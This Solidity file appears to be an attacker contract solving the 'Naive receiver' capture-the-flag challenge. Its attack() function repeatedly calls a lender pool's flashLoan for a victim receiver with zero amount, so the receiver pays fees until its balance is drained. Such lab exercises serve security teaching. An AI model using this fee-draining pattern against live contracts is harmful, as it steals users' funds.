pragma solidity ^0.6.0;

import "./../naive-receiver/FlashLoanReceiver.sol";
import "./../naive-receiver/NaiveReceiverLenderPool.sol";

contract NaiveReceiverAttacker {
    
    address payable owner;
    address payable poolAddress;
    address payable receiverAddress;

    FlashLoanReceiver receiver;
    NaiveReceiverLenderPool pool;

    constructor(address payable _pool, address payable _receiver) public {
        poolAddress = _pool;
        owner = msg.sender;
        receiverAddress = _receiver;
        receiver = FlashLoanReceiver(_receiver);
        pool = NaiveReceiverLenderPool(_pool);
    }

    function attack() public {
        for(uint i = 0; i < 10; i++){
            pool.flashLoan(receiverAddress, 0);
        }
    }
}